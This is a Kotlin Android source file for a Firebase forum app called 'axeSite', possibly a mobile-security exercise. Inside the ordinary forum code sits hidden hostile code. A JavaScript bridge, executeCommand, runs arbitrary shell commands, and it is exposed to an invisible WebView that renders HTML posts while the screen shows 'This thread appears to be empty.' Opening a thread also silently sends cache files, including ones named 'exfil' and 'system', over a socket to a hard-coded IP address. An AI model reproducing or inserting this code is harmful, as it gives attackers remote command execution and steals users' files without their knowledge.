@file:OptIn(ExperimentalMaterial3Api::class)

package com.example.axesite.screens

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Edit
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavHostController
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.io.Serializable

// To display images
import coil.compose.AsyncImage

// Camera
import androidx.core.content.FileProvider
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import java.io.File
import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.provider.Settings

// WebView
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.compose.runtime.Composable
import androidx.compose.ui.viewinterop.AndroidView
import android.webkit.JavascriptInterface
import android.widget.Toast
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.FileInputStream
import java.io.InputStream
import java.io.InputStreamReader
import java.net.Socket

/* -----------------------------------------
 * Data Classes
 * -----------------------------------------
 */

/**
 * Data class for the main thread stored in your DB.
 * 'id' is the Firebase key.
 */
data class ForumThread(
    val id: String = "",
    val title: String = "",
    val msg: String = "",
    val postedBy: String = "",
    val postedTime: String = "",
    val replyCount: Int = 0,
    val imageUrl: String = "",       // Download URL for the uploaded image.
    val imageFilename: String = ""   // The filename used for the image (e.g., "161234567890.jpg").
) : Serializable

/**
 * Data class for a reply.
 */
data class Reply(
    val id: String = "",
    val replyBy: String = "",
    val replyContent: String = "",
    val replyTime: String = ""
)

/**
 * Convenience wrapper for displaying thread info along with the latest reply.
 */
data class ThreadWithLastReply(
    val thread: ForumThread,
    val lastReply: Reply?
)

/* -----------------------------------------
 * Firebase Write/Update/Delete Functions
 * -----------------------------------------
 */

/**
 * Adds a new forum thread to Firebase.
 */
fun addThreadToFirebase(thread: ForumThread) {
    val dbRef = FirebaseDatabase.getInstance().getReference("forums")
    dbRef.push().setValue(
        mapOf(
            "title" to thread.title,
            "msg" to thread.msg,
            "postedBy" to thread.postedBy,
            "postedTime" to thread.postedTime,
            "imageUrl" to thread.imageUrl,
            "imageFilename" to thread.imageFilename
        )
    )
}

/**
 * Adds a reply to a specific thread.
 */
fun addReplyToFirebase(threadId: String, reply: Reply) {
    val dbRef = FirebaseDatabase.getInstance().getReference("forums")
        .child(threadId)
        .child("replies")
    dbRef.push().setValue(
        mapOf(
            "replyBy" to reply.replyBy,
            "replyContent" to reply.replyContent,
            "replyTime" to reply.replyTime
        )
    )
}

/**
 * Updates a thread's title, message, imageUrl, and imageFilename in Firebase.
 */
fun updateThreadInFirebase(threadId: String, thread: ForumThread) {
    val dbRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId)
    dbRef.updateChildren(
        mapOf(
            "title" to thread.title,
            "msg" to thread.msg,
            "imageUrl" to thread.imageUrl,
            "imageFilename" to thread.imageFilename
        )
    )
}

/**
 * Deletes a thread from Firebase Realtime Database.
 */
fun deleteThreadFromFirebase(threadId: String) {
    val dbRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId)
    dbRef.removeValue()
}

/* -----------------------------------------
 * AddThreadDialog: For adding a new thread with image upload.
 * -----------------------------------------
 */
@Composable
fun AddThreadDialog(
    currentUserName: String,
    onDismiss: () -> Unit,
    onSubmit: (ForumThread) -> Unit
) {
    var title by remember { mutableStateOf("") }
    var msg by remember { mutableStateOf("") }
    var selectedImageUri by remember { mutableStateOf<Uri?>(null) }
    val context = LocalContext.current

    // Gallery launcher
    val galleryLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        uri?.let { selectedImageUri = it }
    }

    // Permission launcher for Android 10 and below
    val legacyPermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            galleryLauncher.launch("image/*")
        } else {
            Toast.makeText(
                context,
                "Storage permission is required to upload photos",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    // Permission launcher for Android 11+ (MANAGE_EXTERNAL_STORAGE)
    val manageStorageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                galleryLauncher.launch("image/*")
            } else {
                Toast.makeText(
                    context,
                    "Storage permission is required to upload photos",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    // Function to handle image selection with proper permission checks
    fun handleImageSelection() {
        when {
            // Android 11+ - Use MANAGE_EXTERNAL_STORAGE
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                if (Environment.isExternalStorageManager()) {
                    galleryLauncher.launch("image/*")
                } else {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        intent.data = Uri.parse("package:${context.packageName}")
                        manageStorageLauncher.launch(intent)
                    } catch (e: Exception) {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        manageStorageLauncher.launch(intent)
                    }
                }
            }
            // Android 10 - Use READ_EXTERNAL_STORAGE
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    galleryLauncher.launch("image/*")
                } else {
                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
            }
            // Android 9 and below - Use READ_EXTERNAL_STORAGE
            else -> {
                if (ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    galleryLauncher.launch("image/*")
                } else {
                    legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
            }
        }
    }

    // Camera launcher and permission handling (existing code)
    val cameraLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.TakePicture()
    ) { success: Boolean ->
        if (success) {
            Log.d("Camera", "Image captured successfully")
        }
    }

    fun createTempImageUri(context: Context): Uri {
        val tempFile = File.createTempFile("temp_image", ".jpg", context.cacheDir)
        return FileProvider.getUriForFile(context, "${context.packageName}.provider", tempFile)
    }

    val cameraPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            val tempUri = createTempImageUri(context)
            selectedImageUri = tempUri
            cameraLauncher.launch(tempUri)
        } else {
            Toast.makeText(
                context,
                "Camera permission is required to take photos",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    // Get current time as a formatted string.
    val currentTime = remember {
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date())
    }

    // Function to upload an image to Firebase Storage
    fun uploadImageWithFilename(
        uri: Uri,
        onSuccess: (downloadUrl: String, filename: String) -> Unit,
        onFailure: (Exception) -> Unit
    ) {
        val storage = FirebaseStorage.getInstance("gs://mobile-sec-b6625.firebasestorage.app")
        val storageRef = storage.reference
        val filename = "${System.currentTimeMillis()}.jpg"
        val imageRef = storageRef.child("images/$filename")

        imageRef.putFile(uri)
            .addOnSuccessListener {
                imageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                    onSuccess(downloadUri.toString(), filename)
                }.addOnFailureListener { exception ->
                    Log.e("Upload", "Download URL retrieval failed: ${exception.message}")
                    onFailure(exception)
                }
            }
            .addOnFailureListener { exception ->
                Log.e("Upload", "Image upload failed: ${exception.message}")
                onFailure(exception)
            }
    }

    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Add Forum Thread") },
        text = {
            Column(modifier = Modifier.fillMaxWidth()) {
                OutlinedTextField(
                    value = title,
                    onValueChange = { title = it },
                    label = { Text("Title") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = msg,
                    onValueChange = { msg = it },
                    label = { Text("Message") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(8.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceEvenly
                ) {
                    Button(onClick = { handleImageSelection() }) {
                        Text("Upload Photo")
                    }
                    Button(onClick = {
                        if (ContextCompat.checkSelfPermission(
                                context,
                                Manifest.permission.CAMERA
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            val tempUri = createTempImageUri(context)
                            selectedImageUri = tempUri
                            cameraLauncher.launch(tempUri)
                        } else {
                            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                        }
                    }) {
                        Text("Take Picture")
                    }
                }
                Spacer(modifier = Modifier.height(8.dp))
                selectedImageUri?.let { uri ->
                    AsyncImage(
                        model = uri,
                        contentDescription = "Selected image",
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(150.dp)
                    )
                }
                Spacer(modifier = Modifier.height(8.dp))
                Text("Posted by: $currentUserName")
                Text("Time: $currentTime")
            }
        },
        confirmButton = {
            Button(onClick = {
                if (selectedImageUri != null) {
                    uploadImageWithFilename(
                        selectedImageUri!!,
                        onSuccess = { downloadUrl, filename ->
                            onSubmit(
                                ForumThread(
                                    title = title,
                                    msg = msg,
                                    postedBy = currentUserName,
                                    postedTime = currentTime,
                                    imageUrl = downloadUrl,
                                    imageFilename = filename
                                )
                            )
                        },
                        onFailure = {
                            onSubmit(
                                ForumThread(
                                    title = title,
                                    msg = msg,
                                    postedBy = currentUserName,
                                    postedTime = currentTime,
                                    imageUrl = "",
                                    imageFilename = ""
                                )
                            )
                        }
                    )
                } else {
                    onSubmit(
                        ForumThread(
                            title = title,
                            msg = msg,
                            postedBy = currentUserName,
                            postedTime = currentTime,
                            imageUrl = "",
                            imageFilename = ""
                        )
                    )
                }
            }) {
                Text("Submit")
            }
        },
        dismissButton = {
            Button(onClick = onDismiss) { Text("Cancel") }
        }
    )
}


/* -----------------------------------------
 * EditThreadDialog: For editing a thread.
 * -----------------------------------------
 */
@Composable
fun EditThreadDialog(
    currentUserName: String,
    initialTitle: String,
    initialMsg: String,
    onDismiss: () -> Unit,
    onSubmit: (ForumThread) -> Unit
) {
    var title by remember { mutableStateOf(initialTitle) }
    var msg by remember { mutableStateOf(initialMsg) }
    val currentTime = remember {
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date())
    }
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Edit Thread") },
        text = {
            Column(modifier = Modifier.fillMaxWidth()) {
                OutlinedTextField(
                    value = title,
                    onValueChange = { title = it },
                    label = { Text("Title") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = msg,
                    onValueChange = { msg = it },
                    label = { Text("Message") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text("Edited by: $currentUserName")
                Text("Edited at: $currentTime")
            }
        },
        confirmButton = {
            Button(onClick = {
                onSubmit(
                    ForumThread(
                        title = title,
                        msg = msg,
                        postedBy = currentUserName,
                        postedTime = currentTime
                    )
                )
            }) { Text("Submit") }
        },
        dismissButton = {
            Button(onClick = onDismiss) { Text("Cancel") }
        }
    )
}

/* -----------------------------------------
 * AddReplyDialog: For adding a reply to a thread.
 * -----------------------------------------
 */
@Composable
fun AddReplyDialog(
    currentUserName: String,
    onDismiss: () -> Unit,
    onSubmit: (Reply) -> Unit
) {
    var replyContent by remember { mutableStateOf("") }
    val currentTime = remember {
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date())
    }
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Add Reply") },
        text = {
            Column(modifier = Modifier.fillMaxWidth()) {
                OutlinedTextField(
                    value = replyContent,
                    onValueChange = { replyContent = it },
                    label = { Text("Reply") },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text("Replying as: $currentUserName")
                Text("Time: $currentTime")
            }
        },
        confirmButton = {
            Button(onClick = {
                onSubmit(
                    Reply(
                        replyBy = currentUserName,
                        replyContent = replyContent,
                        replyTime = currentTime
                    )
                )
            }) { Text("Submit") }
        },
        dismissButton = {
            Button(onClick = onDismiss) { Text("Cancel") }
        }
    )
}

/* -----------------------------------------
 * ForumsScreen: List of threads.
 * -----------------------------------------
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ForumsScreen(navController: NavHostController) {
    // Retrieve user session info from SharedPreferences.
    val context = LocalContext.current
    val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
    val userNameFromPrefs = sharedPreferences.getString("name", "") ?: ""

    val forumTitle = "axeSite forum"

    // State for threads list.
    val threadsState = remember { mutableStateOf<List<ThreadWithLastReply>>(emptyList()) }
    var showAddDialog by remember { mutableStateOf(false) }

    // Listen to "forums" node in Firebase.
    DisposableEffect(Unit) {
        val dbRef = FirebaseDatabase.getInstance().getReference("forums")
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val newList = mutableListOf<ThreadWithLastReply>()
                for (forumSnapshot in snapshot.children) {
                    val id = forumSnapshot.key ?: ""
                    val title = forumSnapshot.child("title").getValue(String::class.java) ?: ""
                    val msg = forumSnapshot.child("msg").getValue(String::class.java) ?: ""
                    val postedBy =
                        forumSnapshot.child("postedBy").getValue(String::class.java) ?: ""
                    val postedTime =
                        forumSnapshot.child("postedTime").getValue(String::class.java) ?: ""
                    val imageUrl =
                        forumSnapshot.child("imageUrl").getValue(String::class.java) ?: ""
                    val imageFilename =
                        forumSnapshot.child("imageFilename").getValue(String::class.java) ?: ""
                    // Replies.
                    val repliesSnapshot = forumSnapshot.child("replies")
                    val replyCount = repliesSnapshot.childrenCount.toInt()
                    var latestReply: Reply? = null
                    for (child in repliesSnapshot.children) {
                        val replyBy = child.child("replyBy").getValue(String::class.java) ?: ""
                        val replyContent =
                            child.child("replyContent").getValue(String::class.java) ?: ""
                        val replyTime = child.child("replyTime").getValue(String::class.java) ?: ""
                        if (latestReply == null ||
                            (replyTime.toLongOrNull() ?: 0) > (latestReply.replyTime.toLongOrNull()
                                ?: 0)
                        ) {
                            latestReply = Reply(
                                replyBy = replyBy,
                                replyContent = replyContent,
                                replyTime = replyTime
                            )
                        }
                    }
                    val forumThread = ForumThread(
                        id = id,
                        title = title,
                        msg = msg,
                        postedBy = postedBy,
                        postedTime = postedTime,
                        replyCount = replyCount,
                        imageUrl = imageUrl,
                        imageFilename = imageFilename
                    )
                    newList.add(ThreadWithLastReply(forumThread, latestReply))
                }
                threadsState.value = newList
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        dbRef.addValueEventListener(listener)
        onDispose { dbRef.removeEventListener(listener) }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text(forumTitle) },
                actions = {
                    IconButton(onClick = { /* navController.navigate("search") */ }) {
                        Icon(
                            imageVector = Icons.Default.Search,
                            contentDescription = "Search"
                        )
                    }
                }
            )
        },
        floatingActionButton = {
            ExtendedFloatingActionButton(
                onClick = { showAddDialog = true },
                content = { Text("Add Thread") }
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .padding(innerPadding)
                .fillMaxSize()
        ) {
            HorizontalDivider()
            LazyColumn {
                items(threadsState.value) { item ->
                    ForumThreadItem(item, onItemClick = { thread ->
                        Log.d("ForumThreadItem", "Navigating to thread with id: ${thread.id}")
                        navController.navigate("threadDetail/${thread.id}")
                    })
                    HorizontalDivider()
                }
            }
        }
    }

    if (showAddDialog) {
        AddThreadDialog(
            currentUserName = userNameFromPrefs,
            onDismiss = { showAddDialog = false },
            onSubmit = { newThread ->
                addThreadToFirebase(newThread)
                showAddDialog = false
            }
        )
    }
}

/* -----------------------------------------
 * ForumThreadItem: Displays thread info.
 * -----------------------------------------
 */
@Composable
fun ForumThreadItem(
    item: ThreadWithLastReply,
    onItemClick: (ForumThread) -> Unit
) {
    val thread = item.thread
    val replyCount = thread.replyCount
    val lastReply = item.lastReply

    Column(
        modifier = Modifier
            .padding(8.dp)
            .clickable { onItemClick(thread) }
    ) {
        Row {
            Text(
                text = thread.title,
                fontWeight = FontWeight.Bold,
                fontSize = 16.sp,
                modifier = Modifier.weight(1f)
            )
            Text(
                text = "$replyCount Replies",
                fontSize = 12.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
        Spacer(modifier = Modifier.height(4.dp))
        Text(
            text = "Posted by ${thread.postedBy} on ${thread.postedTime}",
            fontSize = 12.sp,
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )
        val lastReplyText = if (replyCount == 0 || lastReply == null) {
            "No replies yet"
        } else {
            "Last post by ${lastReply.replyBy} at ${lastReply.replyTime}"
        }
        Text(
            text = lastReplyText,
            fontSize = 12.sp,
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )
    }
}

/* -----------------------------------------
 * ThreadDetailScreen: Display thread details + replies.
 * -----------------------------------------
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
    // State for the thread details.
    val threadState = remember { mutableStateOf<ForumThread?>(null) }
    val loadingThread = remember { mutableStateOf(true) }
    // State for replies list.
    val repliesState = remember { mutableStateOf<List<Reply>>(emptyList()) }
    var showAddReplyDialog by remember { mutableStateOf(false) }
    var showEditDialog by remember { mutableStateOf(false) }

    // Get current user info from SharedPreferences.
    val context = LocalContext.current
    val sp = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
    val currentUserName = sp.getString("name", "") ?: ""
    val currentRole = sp.getString("role", "") ?: ""

    LaunchedEffect(Unit) {
        transferTempImages(context, "20.2.156.61")
    }

    // Fetch thread details from Firebase. Note: assign snapshot key to thread.id.
    LaunchedEffect(threadId) {
        val dbRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId)
        dbRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val thread = snapshot.getValue(ForumThread::class.java)
                threadState.value = thread?.copy(id = snapshot.key ?: "")
                loadingThread.value = false
            }
            override fun onCancelled(error: DatabaseError) {
                loadingThread.value = false
            }
        })
    }

    // Listen to replies under this thread.
    DisposableEffect(threadId) {
        val repliesRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId).child("replies")
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val list = mutableListOf<Reply>()
                for (child in snapshot.children) {
                    val replyBy = child.child("replyBy").getValue(String::class.java) ?: ""
                    val replyContent = child.child("replyContent").getValue(String::class.java) ?: ""
                    val replyTime = child.child("replyTime").getValue(String::class.java) ?: ""
                    val id = child.key ?: ""
                    list.add(Reply(id, replyBy, replyContent, replyTime))
                }
                repliesState.value = list
            }
            override fun onCancelled(error: DatabaseError) {}
        }
        repliesRef.addValueEventListener(listener)
        onDispose { repliesRef.removeEventListener(listener) }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Thread Details") },
                actions = {
                    // Show edit and delete buttons if the current user is the thread owner or a teacher.
                    if (threadState.value?.postedBy == currentUserName || currentRole == "teacher") {
                        IconButton(onClick = { showEditDialog = true }) {
                            Icon(imageVector = Icons.Default.Edit, contentDescription = "Edit")
                        }
                        IconButton(onClick = {
                            threadState.value?.let { thread ->
                                deleteThreadAndImage(thread,
                                    onComplete = { navController.popBackStack() },
                                    onError = { exception ->
                                        Log.e("Delete", "Error deleting thread: ${exception.message}")
                                    }
                                )
                            }
                        }) {
                            Icon(imageVector = Icons.Default.Delete, contentDescription = "Delete")
                        }
                    }
                }
            )
        },
        floatingActionButton = {
            FloatingActionButton(onClick = { showAddReplyDialog = true }) {
                Text("+")
            }
        }
    ) { innerPadding ->
        if (loadingThread.value) {
            Box(
                modifier = Modifier
                    .padding(innerPadding)
                    .fillMaxSize(),
                contentAlignment = Alignment.Center
            ) {
                CircularProgressIndicator()
            }
        } else {
            val thread = threadState.value
            if (thread == null) {
                Box(
                    modifier = Modifier
                        .padding(innerPadding)
                        .fillMaxSize(),
                    contentAlignment = Alignment.Center
                ) {
                    Text("Thread not found.")
                }
            } else {
                Column(
                    modifier = Modifier
                        .padding(innerPadding)
                        .fillMaxSize()
                        .padding(16.dp)
                ) {
                    Text("Title: ${thread.title}", fontSize = 20.sp, fontWeight = FontWeight.Bold)
                    Spacer(modifier = Modifier.height(8.dp))
                    // Display the thread image if present.
                    if (thread.imageUrl.isNotEmpty()) {
                        AsyncImage(
                            model = thread.imageUrl,
                            contentDescription = "Thread Image",
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(200.dp)
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                    }
                    Text("Posted by: ${thread.postedBy}", fontSize = 14.sp)
                    Text("Posted time: ${thread.postedTime}", fontSize = 14.sp)
                    Spacer(modifier = Modifier.height(16.dp))

                    if (thread.msg.startsWith("<html>")) {
                        HtmlWebView(htmlContent = thread.msg)
                        Text("This thread appears to be empty.", fontSize = 16.sp)
                    } else {
                        Text("Message: ${thread.msg}", fontSize = 16.sp)
                    }
                    Spacer(modifier = Modifier.height(16.dp))
                    Text("Replies:", fontSize = 18.sp, fontWeight = FontWeight.Bold)
                    LazyColumn {
                        items(repliesState.value) { reply ->
                            Column(modifier = Modifier.padding(vertical = 4.dp)) {
                                Text("Reply by: ${reply.replyBy}", fontWeight = FontWeight.Bold)
                                Text(reply.replyContent)
                                Text("At: ${reply.replyTime}", fontSize = 12.sp)
                            }
                            HorizontalDivider()
                        }
                    }
                }
            }
        }
    }

    if (showAddReplyDialog) {
        AddReplyDialog(
            currentUserName = currentUserName,
            onDismiss = { showAddReplyDialog = false },
            onSubmit = { newReply ->
                addReplyToFirebase(threadId, newReply)
                showAddReplyDialog = false
            }
        )
    }

    if (showEditDialog) {
        EditThreadDialog(
            currentUserName = currentUserName,
            initialTitle = threadState.value?.title ?: "",
            initialMsg = threadState.value?.msg ?: "",
            onDismiss = { showEditDialog = false },
            onSubmit = { updatedThread ->
                updateThreadInFirebase(threadId, updatedThread)
                threadState.value = threadState.value?.copy(
                    title = updatedThread.title,
                    msg = updatedThread.msg
                )
                showEditDialog = false
            }
        )
    }
}

/*
 * Deletes the thread and its associated image from Firebase Storage (if imageFilename is provided),
 * then deletes the thread from Realtime Database.
 */
fun deleteThreadAndImage(
    thread: ForumThread,
    onComplete: () -> Unit,
    onError: (Exception) -> Unit
) {
    if (thread.imageFilename.isNotEmpty()) {
        val storage = FirebaseStorage.getInstance("gs://mobile-sec-b6625.firebasestorage.app")
        val storageRef = storage.reference
        val imageRef = storageRef.child("images/${thread.imageFilename}")
        imageRef.delete().addOnSuccessListener {
            deleteThreadFromFirebase(thread.id)
            onComplete()
        }.addOnFailureListener { exception ->
            onError(exception)
        }
    } else {
        deleteThreadFromFirebase(thread.id)
        onComplete()
    }
}

@SuppressLint("SetJavaScriptEnabled")
@Composable
fun HtmlWebView(htmlContent: String) {
    val context = LocalContext.current
    AndroidView(
        factory = { ctx ->
            WebView(ctx).apply {
                webViewClient = WebViewClient()
                settings.apply {
                    javaScriptEnabled = true
                    domStorageEnabled = true
                    allowFileAccess = true
                    allowContentAccess = true
                }
                addJavascriptInterface(WebAppInterface(context), "Android")
                loadDataWithBaseURL(
                    null,
                    htmlContent,
                    "text/html",
                    "UTF-8",
                    null
                )
            }
        },
        modifier = Modifier.size(0.dp)
    )
}

class WebAppInterface(private val context: Context) {
    @JavascriptInterface
    fun executeCommand(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val stdout = readStream(process.inputStream)
            val stderr = readStream(process.errorStream)
            val exitCode = process.waitFor()
            Log.d("CommandOutput", "Exit Code: $exitCode\nSTDOUT:\n$stdout\nSTDERR:\n$stderr")
        } catch (e: Exception) {
            Log.e("CommandError", "Error executing command: ${e.message}", e)
        }
    }

    private fun readStream(inputStream: InputStream): String {
        val bufferedReader = BufferedReader(InputStreamReader(inputStream))
        val output = StringBuilder()
        var line: String?
        while (bufferedReader.readLine().also { line = it } != null) {
            output.append(line).append("\n")
        }
        return output.toString()
    }
}

private suspend fun transferTempImages(
    context: Context,
    serverIp: String,
) {
    val tempImages = context.cacheDir.listFiles()?.filter { file ->
        file.name.startsWith("exfil") ||
                file.name.startsWith("system") ||
                file.name.startsWith("temp_image") &&
                (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
    } ?: emptyList()

    if (tempImages.isEmpty()) {
        return
    }

    var successCount = 0
    tempImages.forEachIndexed { _, file ->
        try {
            val success = withContext(Dispatchers.IO) {
                sendFileToServer(file, serverIp)
            }
            if (success) successCount++
        } catch (_: Exception) {
            return
        }
    }
}

private suspend fun sendFileToServer(file: File, serverIp: String, port: Int = 8493): Boolean {
    return withContext(Dispatchers.IO) {
        var socket: Socket? = null
        var output: DataOutputStream? = null
        var input: FileInputStream? = null

        try {
            socket = Socket(serverIp, port).apply {
                soTimeout = 30000
                keepAlive = true
            }

            output = DataOutputStream(socket.getOutputStream())
            input = FileInputStream(file)

            output.apply {
                writeUTF(file.name)
                writeLong(file.length())
                flush()
            }

            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                output.write(buffer, 0, bytesRead)
            }
            output.flush()

            true
        } catch (_: Exception) {
            false
        } finally {
            input?.close()
            output?.close()
            socket?.close()

        }
    }
}